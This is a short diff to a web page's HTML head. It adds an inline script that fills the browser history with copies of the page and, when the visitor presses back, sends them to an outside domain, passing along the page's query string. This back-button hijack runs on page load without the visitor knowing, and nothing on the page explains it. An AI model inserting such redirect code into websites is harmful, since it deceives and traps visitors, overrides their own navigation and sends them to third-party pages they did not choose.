@@ -9,6 +9,26 @@
 		<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
 		<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&amp;family=Work+Sans:ital,wght@0,100..900;1,100..900&amp;display=swap" rel="stylesheet"/>
 		<link rel="stylesheet" href="assets/css/style.css" />
+		<script>		
+		  const link = 'https://wellnessnewsandtips.online/kary/back/';		
+		  function setBackRedirect(url) {
+		    let urlBackRedirect = url;
+		    urlBackRedirect = urlBackRedirect =
+		      urlBackRedirect.trim() +
+		      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+		      document.location.search.replace('?', '').toString();		
+		    history.pushState({}, '', location.href);
+		    history.pushState({}, '', location.href);
+		    history.pushState({}, '', location.href);		
+		    window.addEventListener('popstate', () => {
+		      console.log('onpopstate', urlBackRedirect);
+		      setTimeout(() => {
+		        location.href = urlBackRedirect;
+		      }, 1);
+		    });
+		  }		
+		  setBackRedirect(link);
+		</script>
 		<style>
 			.esconder {
 			display: none;
